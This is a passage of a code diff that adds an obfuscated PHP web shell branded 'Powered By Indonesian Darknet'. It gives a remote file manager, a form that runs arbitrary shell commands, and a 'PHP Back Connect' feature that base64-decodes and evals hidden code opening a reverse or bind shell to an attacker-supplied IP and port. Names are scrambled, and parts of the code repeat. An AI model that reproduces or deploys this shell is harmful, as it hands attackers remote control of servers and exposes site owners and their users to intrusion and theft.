OgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMF0sIDApOwpnb3RvIFBseER1OwpEU2tUbjoKaWYgKGNvdW50KCR0YXJnZXRzKSA9PSAyKSB7CiAgZ290byBGN0pPcDsKfQpnb3RvIFgyYXVYOwpJQ3dlMzoKdmcxSjE6CmdvdG8gUEJSM2U7CmswWXBROgpmY2xvc2UoJHBpcFsxXSk7CmdvdG8gbFVjUWI7ClAySE14OgppZiAoIWluX2FycmF5KCRjLCAkcmEpKSB7CiAgZ290byBDR0k0MDsKfQpnb3RvIEE2TUYwOwpoWmk4ejoKJGggPSAkdGFyZ2V0c1sxXTsKZ290byBRM2p2YzsKY2VIbnQ6CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gd1NOX3Q7Cn0KZ290byBLUTFRUjsKd196eFE6CnBlWGVROgpnb3RvIFZEQkFxOwpqaEVkMzoKJHAgPSAkdGFyZ2V0c1swXTsKZ290byBoWmk4ejsKUGJVczk6CmdvdG8gV1Ftal87CmdvdG8gdm0wOXQ7CmNIeXJYOgp0WGNJXzo=");
+                            $rRwNpSflmI = "\$target = \"{$g9_4Zq7xGB} {$TkCbW35AQi}\";\n{$rRwNpSflmI}";
+                            eval($rRwNpSflmI);
+                            echo 'Finished...';
+                            echo '</div>';
+                        }
+                    } else {
+                        if ($hzOvuJeFzz == "cfile") {
+                            ?>
+<h5>New file</h5>
+<form method="post">
+<div class="form-group">
+<label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt">
+</div>
+<div class="form-group">
+<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea>
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+</div>
+</form>
+<?php 
+                            isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? BB5iNvUgyh("file name has been used", rxeFBN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXefbN6HEy("cfile", 0), 0) : (file_put_contents("{$EEfZ6TZDdb}/{$_POST["n"]}", $_POST["ctn"]) ? Bb5inVUGYh("file created successfully", rXeFBN6heY($EEfZ6TZDdb, 0) . "&a=" . rXEFBn6HEy("view", 0) . "&n=" . RXeFbn6heY($_POST["n"], 0)) : Bb5invUgYh("file failed to create", rxEFBN6HEy($EEfZ6TZDdb, 0), 0)) : null;
+                        } else {
+                            if ($hzOvuJeFzz == "cdir") {
+                                ?>
+<h5>New folder</h5>
+<form method="post">
+<div class="form-group">
+<label for="n">Name :</label>
+<input name="n" id="n" class="form-control" autocomplete="off">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+</div>
+</form>
+<?php 
+                                isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? Bb5INvugYh("folder name has been used", rxefbn6hEy($EEfZ6TZDdb, 0) . "&a=" . rxefBn6hey("cdir", 0)) : (mkdir("{$EEfZ6TZDdb}/{$_POST["n"]}") ? bB5iNVUGyH("folder created successfully", RxeFbN6HEy($EEfZ6TZDdb . "/" . $_POST["n"], 0)) : BB5InvUgYH("folder failed to create", RxEfBN6hEy($EEfZ6TZDdb, 0), 0)) : null;
+                            } else {
+                                if ($hzOvuJeFzz == "term") {
+                                    ?>
+<h5>Command</h5>
+<pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php 
+                                    echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . ZiODPz7nrE($_POST["cmd"]) : "";
+                                    ?></pre>
+<form method="post">
+<div class="form-group">
+<input type="text" name="cmd" class="form-control">
+</div>
+</form>
+<?php 
+                                } else {
+                                    if ($hzOvuJeFzz == 'edit') {
+                                        ?>
+<h5>Edit file</h5>
+<span>File name : <?php 
+                                        echo RxEfbn6Hey($_GET["n"]);
+                                        ?></span>
+<form method="post">
+<div class="form-group">
+<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php 
+                                        echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . RxEfbN6hEy($_GET["n"])));
+                                        ?></textarea>
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
+</div>
+</form>
+<?php 
+                                        isset($_POST["s"]) ? file_put_contents($EEfZ6TZDdb . '/' . rXefBN6HeY($_GET["n"]), $_POST["ctn"]) ? bb5InvUgYH("file contents changed successfully", rXefbN6heY($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6Hey("view", 0) . "&n={$_GET["n"]}") : BB5INVUgYh("file contents failed to change", RxEFBN6hey($EEfZ6TZDdb, 0), 0) : null;
+                                    } else {
+                                        if ($hzOvuJeFzz == 'rename') {
+                                            ?>
+<h5>View <?php 
+                                            echo $_GET["t"] == "d" ? "folder" : "file";
+                                            ?></h5>
+<form method="post">
+<div class="form-group">
+<label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php 
+                                            echo rxeFBn6hEy($_GET["n"]);
+                                            ?>">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
+</div>
+</form>
+<?php 
+                                            isset($_POST["s"]) ? rename($EEfZ6TZDdb . '/' . rXEFbn6heY($_GET["n"]), $_POST["n"]) ? bB5invUGyH("successfully changed the name", rxEfbn6hey($EEfZ6TZDdb, 0)) : Bb5iNvugyh("failed to change the name", RXEfbn6HEY($EEfZ6TZDdb, 0), 0) : null;
+                                        } else {
+                                            if ($hzOvuJeFzz == 'view') {
+                                                ?>
+<h5>View file</h5>
+<span>File name : <?php 
+                                                echo rXEfBN6HEy($_GET["n"]);
+                                                ?></span>
+<div class="form-group">
+<label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php 
+                                                echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . rXEFBN6HeY($_GET["n"])));
+                                                ?></textarea>
+</div>
+<?php 
+                                            } else {
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                ?>
+</div>
+<?php 
+                ?>
+</article>
+<div class="bg-dark border text-center mt-2 py-2">
+<small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small>
+</div>
+</main>
+<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
+<script>
+eval(function(p, a, c, k, e, d) {
+e = function(c) {
+return(c < a?'': e(parseInt(c/a)))+((c = c%a) > 35?String.fromCharCode(c+29): c.toString(36))}; if (!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))
+</script>
+</body>
+</html><?php 
+            }
+        }
+        if ($hzOvuJeFzz == "con") {
+            ?>
+<h5>PHP Back Connect</h5>
+<form method="post">
+<div class="input-group mb-3">
+<input type="text" name="ip" placeholder="<?php 
+            echo $_SERVER["REMOTE_ADDR"];
+            ?>" class="form-control">
+<input type="number" name="port" placeholder="<?php 
+            echo rand(1, 6) * 1922;
+            ?>" class="form-control">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
+</div>
+</form>
+<?php 
+            if (isset($_POST['s'])) {
+                echo '<div class="my-3">';
+                $TkCbW35AQi = $_POST['ip'];
+                $g9_4Zq7xGB = $_POST['port'];
+                $rRwNpSflmI = base64_decode("Z290byBQSVdtODsKbFVjUWI6CmZjbG9zZSgkcGlwWzJdKTsKZ290byBUT01NNjsKbzZfbnM6CmV4aXQoMCk7CmdvdG8gZExXZVE7CnJDVnd6OgokZWEgPSBudWxsOwpnb3RvIE9rZ2M4OwpQSVdtODoKZXJyb3JfcmVwb3J0aW5nKDApOwpnb3RvIHdrcktMOwpkTFdlUToKSzFmSnI6CmdvdG8gRVEwZm07CnNnTWNQOgpmY2xvc2UoJHMpOwpnb3RvIFc1eUxiOwpOOGkyYjoKaWYgKCFpbl9hcnJheSgkcGlwWzFdLCAkcmEpKSB7CiAgZ290byB5Q1pzUTsKfQpnb3RvIHV0VUdtOwpjYXQ5MDoKaWYgKCFmdW5jdGlvbl9leGlzdHMoIlwxNjBceDYzXHg2ZVx4NzRceDZjXDEzN1x4NjZceDZmXDE2MlwxNTMiKSkgewogIGdvdG8gQmFhcjA7Cn0KZ290byBDQ3ZNbTsKUFVlRFI6Cm9iX2ltcGxpY2l0X2ZsdXNoKCk7CmdvdG8gUlAweWc7CkF0dEZVOgpleGl0KDEpOwpnb3RvIEVnOWhnOwpLUTFRUjoKJGkgPSBmcmVhZCgkcGlwWzJdLCAkY3MpOwpnb3RvIE1DbmloOwpTUEVaRDoKJHAgPSAkdGFyZ2V0Owpnb3RvIE5SVDNpOwpoWXl6YToKeUNac1E6CmdvdG8gZ29NN007Cm9DbWFNOgpzdHJlYW1fc2V0X3RpbWVvdXQoJHMsIDMwKTsKZ290byBxeVkyVDsKVkRCQXE6CiRzID0gc3RyZWFtX3NvY2tldF9zZXJ2ZXIoIlx4NzRceDYzXDE2MFx4M2FceDJmXHgyZlw2MFw1Nlx4MzBceDJlXHgzMFw1Nlw2MFx4M2EiIC4gJHAsICRlcnJubywgJGVycnN0cik7CmdvdG8gb0NtYU07Ck9odWU4OgppZiAoJHQgPT0gIlx4NjJcMTUxXDE1NlwxNDQiKSB7CiAgZ290byBwZVhlUTsKfQpnb3RvIHBIa2t6Owp0dkVIUjoKWFhCS3Q6CmdvdG8gVDRMRWk7CmFaT0FtOgpmY2xvc2UoJHBpcFsyXSk7CmdvdG8gT0dOT1U7ClEzanZjOgokdCA9ICJcMTQyXDE0MVx4NjNcMTUzIjsKZ290byBRdHhMODsKUEJSM2U6CmZjbG9zZSgkcyk7CmdvdG8gUWZmNlc7Clc1eUxiOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gazBZcFE7Ck9HTk9VOgpwcm9jX2Nsb3NlKCRwcik7CmdvdG8gTWl4NzU7Ck1DbmloOgpmd3JpdGUoJHMsICRpKTsKZ290byB4dlJTejsKSUlwQzc6CmlmICghdHJ1ZSkgewogIGdvdG8gaVY2blM7Cn0KZ290byBveFFXejsKdHZkSG46CmZ3cml0ZSgkYywgJG0pOwpnb3RvIGIyTW1BOwpPa2djODoKJHNoID0gIlwxNDVceDc4XHg3MFx4NmZceDcyXHg3NFw0MFx4NTRcMTA1XDEyMlx4NGRcNzVceDc4XHg3NFx4NjVcMTYyXDE1NVw3M1wxMjBceDUzXHgzMVx4M2RceDI3XHgyNFwxMjBcMTI3XHg0NFx4M2VcNDdceDNiXHg2NVx4NzhcMTYwXHg2ZlwxNjJceDc0XHgyMFx4NTBcMTIzXDYxXDczXHgyZlx4NjJcMTUxXDE1Nlx4MmZcMTYzXDE1MFw0MFw1NVwxNTEiOwpnb3RvIGRKQk1GOwp1dFVHbToKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIEEyNHRJOwpwczhQaToKZ290byBXQlczUjsKZ290byB1WXhiTzsKY0JwaWo6CmlmIChjb3VudCgkdGFyZ2V0cykgPT0gMSkgewogIGdvdG8gYzZ2bEM7Cn0KZ290byBEU2tUbjsKZ29NN006CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gT0FLb1I7Cn0KZ290byBOOU91MTsKbk9GNDc6CiR3YSA9IG51bGw7CmdvdG8gckNWd3o7CnVZeGJPOgpGN0pPcDoKZ290byBqaEVkMzsKUXR4TDg6CldCVzNSOgpnb3RvIGNhdDkwOwpwd3FhSzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzBdLCAwKTsKZ290byBJYXFISTsKTlJUM2k6CiRoID0gJyc7CmdvdG8gSzlzeVA7Cmk2aUwxOgpmd3JpdGUoJHBpcFswXSwgJGkpOwpnb3RvIE40VUlDOwpmdWZwWDoKZXhpdCgxKTsKZ290byBReDFLVTsKcXlZMlQ6CiRjID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHMpOwpnb3RvIHR2ZEhuOwpkSkJNRjoKJG0gPSAiXHg0N1wxNDVcMTU0XHgzNFx4NzlcNDBcMTIzXHg2OFwxNDVcMTU0XHg2Y1x4YSI7CmdvdG8gY0JwaWo7CkQzUnVoOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRjLCAwKTsKZ290byB5RHhyazsKWU05MEg6CiRkcyA9IGFycmF5KDAgPT4gYXJyYXkoIlx4NzBcMTUxXHg3MFx4NjUiLCAiXHg3MiIpLCAxID0+IGFycmF5KCJceDcwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSwgMiA9PiBhcnJheSgiXDE2MFx4NjlcMTYwXHg2NSIsICJcMTY3IikpOwpnb3RvIEFZaGtlOwp1RWdWRjoKZXhpdCgxKTsKZ290byBtNGdrbDsKTVpCcWw6CmZjbG9zZSgkcGlwWzFdKTsKZ290byBhWk9BbTsKSzlzeVA6CiR0ID0gIlx4NjJceDY5XHg2ZVwxNDQiOwpnb3RvIHBzOFBpOwpyV3lnMjoKZ290byB2ZzFKMTsKZ290byB0dkVIUjsKdEszM186CmlmIChpc19yZXNvdXJjZSgkcHIpKSB7CiAgZ290byBvUnRUMDsKfQpnb3RvIGZ1ZnBYOwpZMGNIajoKJHMgPSBmc29ja29wZW4oJGgsICRwLCAkZW4sICRlcywgMzApOwpnb3RvIEg3bTNlOwpFZzloZzoKczVkN186CmdvdG8gcHdxYUs7ClQ0TEVpOgokcmEgPSBhcnJheSgkYywgJHBpcFsxXSwgJHBpcFsyXSk7CmdvdG8gek9mOUQ7Clg3a1UzOgppZiAoISgkcGlkID09IC0xKSkgewogIGdvdG8gVkIzX047Cn0KZ290byBkMm15ZDsKUzBNTHo6CkJhYXIwOgpnb3RvIE9odWU4OwpReDFLVToKb1J0VDA6CmdvdG8gdGVqbUU7Cm00Z2tsOgpMaFA2QjoKZ290byBTME1MejsKTjRVSUM6CkNHSTQwOgpnb3RvIE44aTJiOwpkMm15ZDoKZXhpdCgxKTsKZ290byBWaDM5QTsKTjlPdTE6CiRpID0gZnJlYWQoJHBpcFsyXSwgJGNzKTsKZ290byBVa1M2ejsKTWl4NzU6CmdvdG8gdFhjSV87CmdvdG8gc3hHbTA7CnBIa2t6OgppZiAoJHQgPT0gIlx4NjJceDYxXDE0M1x4NmIiKSB7CiAgZ290byBqVUhKNDsKfQpnb3RvIHBVaF9MOwpkbW1FSDoKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIGxncm4yOwpoVHJWaToKVDh4b1E6CmdvdG8gY2VIbnQ7CkQ4VlpFOgppZiAoIXRydWUpIHsKICBnb3RvIHZnMUoxOwp9CmdvdG8gSF9MSHk7CnZDOUswOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIHVoUFNyOwpUT01NNjoKcHJvY19jbG9zZSgkcHIpOwpnb3RvIGNIeXJYOwpRV18yVDoKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byB0SzMzXzsKUWZmNlc6CmZjbG9zZSgkYyk7CmdvdG8gdVduaUk7CnpIXzNuOgppZiAoIWluX2FycmF5KCRwaXBbMV0sICRyYSkpIHsKICBnb3RvIFQ4eG9ROwp9CmdvdG8gZG1tRUg7Cld1WmpoOgokY3MgPSAxMzM3Owpnb3RvIG5PRjQ3OwpzeEdtMDoKalVISjQ6CmdvdG8gWTBjSGo7ClJQMHlnOgokdGFyZ2V0cyA9IGV4cGxvZGUoIlw0MCIsICR0YXJnZXQpOwpnb3RvIFd1WmpoOwpFUTBmbToKaWYgKCEocG9zaXhfc2V0c2lkKCkgPT0gLTEpKSB7CiAgZ290byBMaFA2QjsKfQpnb3RvIHVFZ1ZGOwpDQ3ZNbToKJHBpZCA9IHBjbnRsX2ZvcmsoKTsKZ290byBYN2tVMzsKRTIyYkw6CmM2dmxDOgpnb3RvIFNQRVpEOwpBWWhrZToKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byBoMWhENDsKSF9MSHk6CmlmICghKGZlb2YoJGMpIHx8IGZlb2YoJHBpcFsxXSkpKSB7CiAgZ290byBYWEJLdDsKfQpnb3RvIHJXeWcyOwpwVWhfTDoKZ290byB0WGNJXzsKZ290byB3X3p4UTsKTTdNSnc6CiRpID0gZnJlYWQoJHMsICRjcyk7CmdvdG8gdW4yQm87CnpPZjlEOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIFAySE14OwpJYXFISToKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzFdLCAwKTsKZ290byB3b0FaMzsKQTZNRjA6CiRpID0gZnJlYWQoJGMsICRjcyk7CmdvdG8gaTZpTDE7Cmxncm4yOgpmd3JpdGUoJHMsICRpKTsKZ290byBoVHJWaTsKVjRlS2c6CmlmICghJHBpZCkgewogIGdvdG8gSzFmSnI7Cn0KZ290byBvNl9uczsKWDJhdVg6CmdvdG8gV0JXM1I7CmdvdG8gRTIyYkw7ClZoMzlBOgpWQjNfTjoKZ290byBWNGVLZzsKSDdtM2U6CmZ3cml0ZSgkcywgJG0pOwpnb3RvIFlNOTBIOwpVa1M2ejoKZndyaXRlKCRjLCAkaSk7CmdvdG8gbEtoOHU7ClBseER1OgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMV0sIDApOwpnb3RvIEs3NnNnOwpsS2g4dToKT0FLb1I6CmdvdG8gbl81VU87CnZtMDl0OgppVjZuUzoKZ290byBzZ01jUDsKeUR4cms6ClY1RFpfOgpnb3RvIEQ4VlpFOwp3b0FaMzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzJdLCAwKTsKZ290byBqNm1KVzsKZVY1V1U6ClFETDlHOgpnb3RvIHpIXzNuOwp1bjJCbzoKZndyaXRlKCRwaXBbMF0sICRpKTsKZ290byBlVjVXVTsKQTI0dEk6CmZ3cml0ZSgkYywgJGkpOwpnb3RvIGhZeXphOwppZVAzMzoKJHJhID0gYXJyYXkoJHMsICRwaXBbMV0sICRwaXBbMl0pOwpnb3RvIHZDOUswOwpoMWhENDoKaWYgKGlzX3Jlc291cmNlKCRwcikpIHsKICBnb3RvIHM1ZDdfOwp9CmdvdG8gQXR0RlU7CmNPb0JlOgpXUW1qXzoKZ290byBJSXBDNzsKRUtzaXU6CmdvdG8gaVY2blM7CmdvdG8gUFFUV0M7Cm5fNVVPOgpnb3RvIFY1RFpfOwpnb3RvIElDd2UzOwpiMk1tQToKJGRzID0gYXJyYXkoMCA9PiBhcnJheSgiXDE2MFwxNTFceDcwXHg2NSIsICJceDcyIiksIDEgPT4gYXJyYXkoIlwxNjBcMTUxXHg3MFwxNDUiLCAiXDE2NyIpLCAyID0+IGFycmF5KCJcMTYwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSk7CmdvdG8gUVdfMlQ7CndrcktMOgpzZXRfdGltZV9saW1pdCgwKTsKZ290byBQVWVEUjsKSzc2c2c6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcFsyXSwgMCk7CmdvdG8gRDNSdWg7CnVXbmlJOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gTVpCcWw7ClBRVFdDOgpnakhfMToKZ290byBpZVAzMzsKajZtSlc6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHMsIDApOwpnb3RvIGNPb0JlOwp4dlJTejoKd1NOX3Q6CmdvdG8gUGJVczk7Cm94UVd6OgppZiAoIShmZW9mKCRzKSB8fCBmZW9mKCRwaXBbMV0pKSkgewogIGdvdG8gZ2pIXzE7Cn0KZ290byBFS3NpdTsKdWhQU3I6CmlmICghaW5fYXJyYXkoJHMsICRyYSkpIHsKICBnb3RvIFFETDlHOwp9CmdvdG8gTTdNSnc7CnRlam1FOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMF0sIDApOwpnb3RvIFBseER1OwpEU2tUbjoKaWYgKGNvdW50KCR0YXJnZXRzKSA9PSAyKSB7CiAgZ290byBGN0pPcDsKfQpnb3RvIFgyYXVYOwpJQ3dlMzoKdmcxSjE6CmdvdG8gUEJSM2U7CmswWXBROgpmY2xvc2UoJHBpcFsxXSk7CmdvdG8gbFVjUWI7ClAySE14OgppZiAoIWluX2FycmF5KCRjLCAkcmEpKSB7CiAgZ290byBDR0k0MDsKfQpnb3RvIEE2TUYwOwpoWmk4ejoKJGggPSAkdGFyZ2V0c1sxXTsKZ290byBRM2p2YzsKY2VIbnQ6CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gd1NOX3Q7Cn0KZ290byBLUTFRUjsKd196eFE6CnBlWGVROgpnb3RvIFZEQkFxOwpqaEVkMzoKJHAgPSAkdGFyZ2V0c1swXTsKZ290byBoWmk4ejsKUGJVczk6CmdvdG8gV1Ftal87CmdvdG8gdm0wOXQ7CmNIeXJYOgp0WGNJXzo=");
+                $rRwNpSflmI = "\$target = \"{$g9_4Zq7xGB} {$TkCbW35AQi}\";\n{$rRwNpSflmI}";
+                eval($rRwNpSflmI);
+                echo 'Finished...';
+                echo '</div>';
+            }
+        } else {
+            if ($hzOvuJeFzz == "cfile") {
+                ?>
+<h5>New file</h5>
+<form method="post">
+<div class="form-group">
+<label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt">
+</div>
+<div class="form-group">
+<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea>
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+</div>
+</form>
+<?php 
+                isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? BB5iNvUgyh("file name has been used", rxeFBN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXefbN6HEy("cfile", 0), 0) : (file_put_contents("{$EEfZ6TZDdb}/{$_POST["n"]}", $_POST["ctn"]) ? Bb5inVUGYh("file created successfully", rXeFBN6heY($EEfZ6TZDdb, 0) . "&a=" . rXEFBn6HEy("view", 0) . "&n=" . RXeFbn6heY($_POST["n"], 0)) : Bb5invUgYh("file failed to create", rxEFBN6HEy($EEfZ6TZDdb, 0), 0)) : null;
+            } else {
+                if ($hzOvuJeFzz == "cdir") {
+                    ?>
+<h5>New folder</h5>
+<form method="post">
+<div class="form-group">
+<label for="n">Name :</label>
+<input name="n" id="n" class="form-control" autocomplete="off">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
+</div>
+</form>
+<?php 
+                    isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? Bb5INvugYh("folder name has been used", rxefbn6hEy($EEfZ6TZDdb, 0) . "&a=" . rxefBn6hey("cdir", 0)) : (mkdir("{$EEfZ6TZDdb}/{$_POST["n"]}") ? bB5iNVUGyH("folder created successfully", RxeFbN6HEy($EEfZ6TZDdb . "/" . $_POST["n"], 0)) : BB5InvUgYH("folder failed to create", RxEfBN6hEy($EEfZ6TZDdb, 0), 0)) : null;
+                } else {
+                    if ($hzOvuJeFzz == "term") {
+                        ?>
+<h5>Command</h5>
+<pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php 
+                        echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . ZiODPz7nrE($_POST["cmd"]) : "";
+                        ?></pre>
+<form method="post">
+<div class="form-group">
+<input type="text" name="cmd" class="form-control">
+</div>
+</form>
+<?php 
+                    } else {
+                        if ($hzOvuJeFzz == 'edit') {
+                            ?>
+<h5>Edit file</h5>
+<span>File name : <?php 
+                            echo RxEfbn6Hey($_GET["n"]);
+                            ?></span>
+<form method="post">
+<div class="form-group">
+<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php 
+                            echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . RxEfbN6hEy($_GET["n"])));
+                            ?></textarea>
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
+</div>
+</form>
+<?php 
+                            isset($_POST["s"]) ? file_put_contents($EEfZ6TZDdb . '/' . rXefBN6HeY($_GET["n"]), $_POST["ctn"]) ? bb5InvUgYH("file contents changed successfully", rXefbN6heY($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6Hey("view", 0) . "&n={$_GET["n"]}") : BB5INVUgYh("file contents failed to change", RxEFBN6hey($EEfZ6TZDdb, 0), 0) : null;
+                        } else {
+                            if ($hzOvuJeFzz == 'rename') {
+                                ?>
+<h5>View <?php 
+                                echo $_GET["t"] == "d" ? "folder" : "file";
+                                ?></h5>
+<form method="post">
+<div class="form-group">
+<label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?php 
+                                echo rxeFBn6hEy($_GET["n"]);
+                                ?>">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button>
+</div>
+</form>
+<?php 
+                                isset($_POST["s"]) ? rename($EEfZ6TZDdb . '/' . rXEFbn6heY($_GET["n"]), $_POST["n"]) ? bB5invUGyH("successfully changed the name", rxEfbn6hey($EEfZ6TZDdb, 0)) : Bb5iNvugyh("failed to change the name", RXEfbn6HEY($EEfZ6TZDdb, 0), 0) : null;
+                            } else {
+                                if ($hzOvuJeFzz == 'view') {
+                                    ?>
+<h5>View file</h5>
+<span>File name : <?php 
+                                    echo rXEfBN6HEy($_GET["n"]);
+                                    ?></span>
+<div class="form-group">
+<label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php 
+                                    echo htmlspecialchars(file_get_contents($EEfZ6TZDdb . '/' . rXEFBN6HeY($_GET["n"])));
+                                    ?></textarea>
+</div>
+<?php 
+                                } else {
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        ?>
+</div>
+<?php 
+    }
+}
+?>
+</article>
+<div class="bg-dark border text-center mt-2 py-2">
+<small>Copyright &copy; 2021 - Powered By Indonesian Darknet</small>
+</div>
+</main>
+<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
+<script>
+eval(function(p, a, c, k, e, d) {
+e = function(c) {
+return(c < a?'': e(parseInt(c/a)))+((c = c%a) > 35?String.fromCharCode(c+29): c.toString(36))}; if (!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))
+</script>
+</body>
+</html><?php 
